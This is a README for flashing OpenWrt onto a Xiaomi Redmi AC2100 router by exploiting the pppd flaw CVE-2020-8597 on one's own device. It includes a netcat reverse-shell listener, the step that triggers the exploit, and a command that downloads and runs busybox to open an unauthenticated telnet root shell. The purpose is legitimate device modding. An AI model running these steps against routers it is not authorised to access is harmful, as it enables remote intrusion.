# Xiaomi Redmi Router AC2100

The Xiaomi Redmi Router AC2100 is a wireless router based on the MT7621 platform. While it can be acquired for relatively low cost compared to other units with similar specifications, it requires a somewhat complex installation process in order to bypass a locked down stock firmware to install OpenWrt.

## Installation

Installation of OpenWrt on this device requires exploiting [CVE-2020-8597](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8597) to achieve shell access.

### Requirements

- A computer with an ethernet adapter
- Two ethernet cables
- python 3 and required libraries `pip install -r requirements.txt`
- netcat

### Instructions

These instructions assume that the ethernet interface being used is named eth0, please adjust the interface name to your own setup as required within the python scripts. Some of these commands may require to be run as root.

#### Initial setup

1. Setup your ethernet interface with the ip address: `192.168.31.177`
2. Bridge the `WAN` port on the router with one of the `LAN` ports on the router by connecting an ethernet cable between them.
3. Connect your computer to the router with your other ethernet cable.

``` bash
# Start our PPPoE emulator
python pppoe-simulator.py
```

Now we can run our router through the initial setup wizard on `http://192.168.31.1`, during which PPPoE should be auto-detected and chosen. Any combination of credentials are acceptable.

``` bash
# A quick http server for the current directory (ie. Where you have placed your OpenWrt images)
python -m http.server 80
# And in another window...
netcat -nvlp 31337
```

#### Running the exploit

``` bash
# In another window to trigger the exploit
python pppd-cve.py
```

In your terminal with netcat open you should see an incoming connection from the router, and we can begin **typing in commands below on that same terminal** to be run on the router.

``` bash
cd /tmp && wget http://192.168.31.177/busybox-mipsel && chmod +x ./busybox-mipsel && ./busybox-mipsel telnetd -l /bin/sh
```

If you are disconnected prematurely, just start the netcat listener and exploit script again.

After you have secured telnet access to the device you can wget the OpenWrt images onto the device and flash them.

#### Writing the OpenWrt images

After connecting to telnet on 192.168.31.1 :

``` bash
wget http://192.168.31.177/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin
wget http://192.168.31.177/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin
# Enable uart and bootdelay, useful for testing or recovery if you have an uart adapter!
nvram set uart_en=1
nvram set bootdelay=5
# Set kernel1 as the booting kernel
nvram set flag_try_sys1_failed=1
# Commit our nvram changes
nvram commit
# Flash the kernel
mtd write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1
# Flash the rootfs and reboot
mtd -r write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0
```

If all has gone well, you should be rebooting into OpenWrt.

#### Install Luci

ssh connect 192.168.1.1 login as: root (root is also the default password)

``` bash
root@OpenWrt:~# opkg update
root@OpenWrt:~# opkg install luci
```
